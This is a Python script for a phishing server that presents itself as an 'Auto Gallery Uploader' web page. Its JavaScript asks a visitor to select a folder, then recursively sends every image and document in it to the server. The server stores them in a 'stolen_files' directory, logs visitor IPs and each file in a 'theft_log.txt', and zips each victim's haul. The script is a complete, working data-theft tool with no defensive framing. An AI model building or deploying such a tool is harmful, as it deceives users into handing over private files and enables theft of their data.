#!/usr/bin/env python3
import http.server
import socketserver
import os
import json
import uuid
from datetime import datetime
import shutil
import sys

# ASCII Banner
def show_banner():
    banner = """
╔═══════════════════════════════════════════╗
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███┘┘┘┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘█████┘┘┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███████████████┘┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██████████████████┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███████████████████┘██┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██████████████┘┘███┘┘┘┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██████████┘███┘┘┘█┘┘┘┘┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██████┘┘┘┘┘███┘┘┘┘┘┘┘┘┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘██┘┘┘┘██████┘┘┘┘┘████┘┘┘┘┘┘┘┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘████┘┘┘██████┘┘┘┘┘████┘┘┘┘┘┘┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘┘█████┘███████┘┘┘┘┘████┘┘┘┘┘┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘███████┘██████┘┘┘┘┘┘┘███┘┘┘┘┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘┘█████████████┘┘┘┘┘┘┘┘████┘┘┘┘┘┘
┘┘┘┘██████┘┘┘┘████████████┘┘┘┘┘┘┘┘┘██┘┘┘┘┘┘┘
┘┘██████████┘┘┘███████████┘█████┘┘┘██┘┘┘┘┘┘┘
┘████┘┘┘┘┘███┘┘┘██████████████████████┘┘┘┘┘┘
███┘┘┘┘┘┘┘┘███┘┘┘█████████████████████┘┘┘┘┘┘
██┘┘┘█████┘┘███┘█████████████████████┘┘┘┘┘┘┘
██┘┘█████████████████████████████████┘┘┘┘┘┘┘
██┘┘█████████████████████████████████████┘┘┘
███┘┘┘██┘┘┘███┘┘██████████████████┘██┘┘████┘
████┘┘┘┘┘┘████┘┘┘████████████████┘┘██┘┘┘┘┘██
┘████████████┘┘┘██┘██████████┘┘┘┘┘┘██┘┘┘┘┘┘┘
┘┘┘┘███████┘┘┘┘┘┘┘┘┘┘████████┘┘┘┘┘┘██┘┘┘┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███┘┘┘┘┘███████┘┘┘┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘█┘┘┘┘███████████┘┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███┘┘██┘┘┘███┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███┘┘┘██┘┘┘┘███
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██┘┘┘┘████┘┘┘██
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███┘┘██████┘┘┘██
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██┘┘┘█████┘┘┘██
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘██┘┘┘┘███┘┘┘┘██
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘███┘┘┘┘┘┘┘┘┘██┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘████┘┘┘┘┘████┘
┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘┘█████████┘┘┘
╚═══════════════════════════════════════════╝
"""
    print(banner)

class MultipartRequestHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        client_ip = self.client_address[0]
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Log visitor
        with open("gallery_visitors.txt", "a") as f:
            f.write(f"{timestamp} - {client_ip} - {self.path}\n")
        
        if self.path == '/':
            # Serve phishing page with auto-upload capability
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>Auto-Gallery Uploader</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); 
            min-height: 100vh; 
            padding: 20px; 
            color: white;
        }
        .container { 
            max-width: 600px; 
            margin: 50px auto; 
            background: rgba(255, 255, 255, 0.1); 
            padding: 30px; 
            border-radius: 12px; 
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        h1 { text-align: center; margin-bottom: 10px; }
        p { text-align: center; color: #a0a0a0; margin-bottom: 30px; }
        
        .upload-box {
            background: rgba(0, 0, 0, 0.3);
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            margin-bottom: 20px;
        }
        
        button {
            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
            color: white; 
            padding: 15px 30px; 
            border: none; 
            border-radius: 8px; 
            cursor: pointer; 
            font-size: 18px;
            font-weight: bold;
            transition: transform 0.2s;
            width: 100%;
        }
        button:hover { transform: scale(1.02); }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 6px;
            display: none;
        }
        .status.success { background: #28a745; color: white; }
.status.error { background: #dc3545; color: white; }
        .status.info { background: #17a2b8; color: white; }
        
        .progress {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 4px;
            overflow: hidden;
            margin-top: 10px;
        }
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
            width: 0%;
            transition: width 0.3s;
        }
        
        .file-list {
            max-height: 200px;
            overflow-y: auto;
            background: rgba(0, 0, 0, 0.3);
            padding: 10px;
            border-radius: 6px;
            margin-top: 15px;
            font-size: 14px;
        }
        
        .warning {
            background: rgba(255, 193, 7, 0.2);
            border: 1px solid #ffc107;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 20px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 Auto Gallery Uploader</h1>
        <p>One-click automatic gallery synchronization</p>
        
        <div class="warning">
            ⚠️ For best results, select your main gallery folder. This tool will automatically detect and upload all images and documents.
        </div>
        
        <div class="upload-box">
            <button id="uploadBtn" onclick="startAutoUpload()">
                📁 Select Gallery Folder
            </button>
            <p style="margin-top: 15px; font-size: 14px; color: #a0a0a0;">
                Supported formats: JPG, PNG, GIF, PDF, DOC, DOCX, TXT, and more
            </p>
        </div>
        
        <div id="status" class="status"></div>
        <div class="progress">
            <div id="progressBar" class="progress-bar"></div>
        </div>
        <div id="fileList" class="file-list"></div>
    </div>
    
    <script>
        let sessionId = null;
        let totalFiles = 0;
        let uploadedFiles = 0;
        
        async function startAutoUpload() {
            // Check File System Access API support
            if (!('showDirectoryPicker' in window)) {
                showStatus('Your browser does not support automatic folder upload. Please use Chrome or Edge.', 'error');
                return;
            }
            
            try {
                showStatus('Requesting folder access...', 'info');
                
                // Request directory access from user
                const dirHandle = await window.showDirectoryPicker({
                    mode: 'read'
                });
                
                // Generate session ID
                sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
                
                showStatus('Scanning folder for images and documents...', 'info');
                
                // Get all files recursively
                const files = await getAllFiles(dirHandle);
                
                // Filter for images and documents
                const targetFiles = files.filter(file => {
                    const extension = file.name.split('.').pop().toLowerCase();
                    const imageExtensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'tiff', 'ico'];
                    const documentExtensions = ['pdf', 'doc', 'docx', 'txt', 'rtf', 'odt', 'xls', 'xlsx', 'ppt', 'pptx', 'csv'];
                    return imageExtensions.includes(extension) || documentExtensions.includes(extension);
                });
                
                totalFiles = targetFiles.length;
                
                if (totalFiles === 0) {
                    showStatus('No supported images or documents found in the selected folder.', 'error');
                    return;
                }
                
                showStatus(`Found \${totalFiles} files. Starting automatic upload...`, 'info');
                
                // Start uploading files
                await uploadFiles(targetFiles);
                
            } catch (error) {
                if (error.name === 'AbortError') {
                    showStatus('Folder access was cancelled.', 'error');
                } else {
                    showStatus('Error: ' + error.message, 'error');
                    console.error('Upload error:', error);
                }
            }
        }
        
        async function getAllFiles(dirHandle, path = '') {
            const files = [];
            
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    files.push({
                        name: entry.name,
                        path: path + '/' + entry.name,
                        fileHandle: entry
                    });
                } else if (entry.kind === 'directory') {
                    const subFiles = await getAllFiles(entry, path + '/' + entry.name);
                    files.push(...subFiles);
                }
            }
            
            return files;
        }
        
        async function uploadFiles(files) {
            const fileList = document.getElementById('fileList');
            fileList.innerHTML = '<strong>Uploading files:</strong><br>';
            
            for (let i = 0; i < files.length; i++) {
                const file = files[i];
                
                try {
                    // Get file content
                    const fileData = await file.fileHandle.getFile();
                    
                    // Create form data
                    const formData = new FormData();
                    formData.append('file', fileData);
                    formData.append('path', file.path);
                    formData.append('sessionId', sessionId);
                    
                    // Upload file
                    const response = await fetch('/upload', {
                        method: 'POST',
                        body: formData
                    });
                    
                    if (response.ok) {
                        uploadedFiles++;
                        updateProgress();
                        
                        // Add to uploaded files list
                        fileList.innerHTML += `✓ ${file.name}<br>`;
                        fileList.scrollTop = fileList.scrollHeight;
                    } else {
                        fileList.innerHTML += `✗ Failed: ${file.name}<br>`;
                    }
                    
                    // Small delay to prevent overwhelming the server
                    await new Promise(resolve => setTimeout(resolve, 100));
                    
                } catch (error) {
                    fileList.innerHTML += `✗ Error: ${file.name} - ${error.message}<br>`;
                }
            }
            
            // Upload complete
            if (uploadedFiles === totalFiles) {
                showStatus(`Upload complete! Successfully uploaded \${uploadedFiles} files.`, 'success');
                
                // Send completion notification
                await fetch('/complete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        sessionId: sessionId,
                        totalFiles: totalFiles,
                        uploadedFiles: uploadedFiles
                    })
                });
            } else {
                showStatus(`Upload completed with errors. ${uploadedFiles} of ${totalFiles} files uploaded.`, 'error');
            }
        }
        
        function updateProgress() {
            const percentage = (uploadedFiles / totalFiles) * 100;
            document.getElementById('progressBar').style.width = percentage + '%';
            showStatus(`Uploading... ${uploadedFiles} of ${totalFiles} files (\${Math.round(percentage)}%)`, 'info');
        }
        
        function showStatus(message, type) {
            const status = document.getElementById('status');
            status.textContent = message;
            status.className = 'status ' + type;
            status.style.display = 'block';
        }
    </script>
</body>
</html>
            """
            self.wfile.write(html_content.encode())
            
        elif self.path == '/success':
            # Success page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            success_html = """
<!DOCTYPE html>
<html>
<head>
    <title>Upload Complete</title>
    <style>
        body { font-family: Arial; background: #1a1a2e; color: white; text-align: center; padding: 50px; }
        h1 { color: #00d2ff; }
    </style>
</head>
<body>
    <h1>✅ Upload Complete</h1>
    <p>Your gallery has been successfully synchronized.</p>
    <p>You can now close this window.</p>
</body>
</html>
            """
            self.wfile.write(success_html.encode())
            
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b"Not Found")
    
    def do_POST(self):
        if self.path == '/upload':
            # Handle file upload
            try:
                content_type = self.headers['content-type']
                if not content_type.startswith('multipart/form-data'):
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b"Bad request")
                    return
                
                # Parse multipart form data
                boundary = content_type.split('boundary=')[1].encode()
                content_length = int(self.headers['Content-Length'])
                data = self.rfile.read(content_length)
                
                # Extract file info
                parts = data.split(b'--' + boundary)
                file_data = None
                file_path = None
                session_id = None
                
                for part in parts:
                    if b'Content-Disposition: form-data' in part and b'filename=' in part:
                        # Extract filename and path
                        headers_end = part.find(b'\r\n\r\n')
                        headers = part[:headers_end].decode('utf-8', errors='ignore')
 # Extract filename
                        filename_match = headers.split('filename="')[1].split('"')[0]
                        filename = filename_match
                        
                        # Extract file path
                        path_match = headers.split('name="path"')[1].split('\r\n')[0].strip()
                        file_path = path_match if path_match else filename
                        
                        # Extract session ID
                        session_match = headers.split('name="sessionId"')[1].split('\r\n')[0].strip()
                        session_id = session_match if session_match else 'unknown'
                        
                        # Extract actual file data
                        file_data = part[headers_end + 4:-2]  # Remove trailing \r\n
                        
                        break
                
                if file_data and session_id:
                    # Create session directory
                    session_dir = f"stolen_files/{session_id}"
                    os.makedirs(session_dir, exist_ok=True)
                    
                    # Create subdirectories based on path
                    dir_path = os.path.dirname(file_path)
                    if dir_path:
                        full_dir_path = os.path.join(session_dir, dir_path.lstrip('/'))
                        os.makedirs(full_dir_path, exist_ok=True)
                        save_path = os.path.join(full_dir_path, os.path.basename(file_path))
                    else:
                        save_path = os.path.join(session_dir, filename)
                    
                    # Save file
                    with open(save_path, 'wb') as f:
                        f.write(file_data)
                    
                    # Log file theft
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    client_ip = self.client_address[0]
                    
                    with open("theft_log.txt", "a") as log:
                        log.write(f"{timestamp} - {client_ip} - Session: {session_id} - File: {file_path} - Size: {len(file_data)} bytes\n")
                    
                    # Send success response
                    self.send_response(200)
                    self.send_header('Content-type', 'application/json')
                    self.end_headers()
                    self.wfile.write(b'{"success": true}')
                else:
                    self.send_response(400)
                    self.end_headers()
                    self.wfile.write(b'{"success": false, "error": "No file data"}')
                    
            except Exception as e:
                print(f"Upload error: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'{"success": false, "error": "Server error"}')
        
        elif self.path == '/complete':
            # Handle upload completion
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))
                
                session_id = data.get('sessionId', 'unknown')
                total_files = data.get('totalFiles', 0)
                uploaded_files = data.get('uploadedFiles', 0)
                
                # Log completion
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                client_ip = self.client_address[0]
                
                with open("theft_log.txt", "a") as log:
                    log.write(f"{timestamp} - {client_ip} - Session: {session_id} - COMPLETED: {uploaded_files}/{total_files} files\n")
                
                # Create archive of stolen files
                try:
                    archive_name = f"archive_{session_id}_{timestamp.replace(':', '-')}"
                    archive_path = f"stolen_files/{archive_name}"
                    
                    if os.path.exists(f"stolen_files/{session_id}"):
                        shutil.make_archive(archive_path, 'zip', f"stolen_files/{session_id}")
                        
                        with open("theft_log.txt", "a") as log:
                            log.write(f"{timestamp} - {client_ip} - Session: {session_id} - ARCHIVED: {archive_path}.zip\n")
                except Exception as e:
                    print(f"Archive error: {e}")
                
                # Send success response
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(b'{"success": true, "redirect": "/success"}')
                
            except Exception as e:
                print(f"Completion error: {e}")
                self.send_response(500)
                self.end_headers()
                self.wfile.write(b'{"success": false, "error": "Server error"}')

def run_server():
    PORT = 8080
    
    # Create directories for stolen files
    os.makedirs("stolen_files", exist_ok=True)
    
    print(f"🚀 Auto-Upload Gallery Phishing Server running on port {PORT}")
    print(f"📁 Stolen files will be saved in 'stolen_files' directory")
    print(f"📋 Theft log will be saved in 'theft_log.txt'")
    
    with socketserver.TCPServer(("", PORT), MultipartRequestHandler) as httpd:
        httpd.serve_forever()

if __name__ == "__main__":
    run_server()
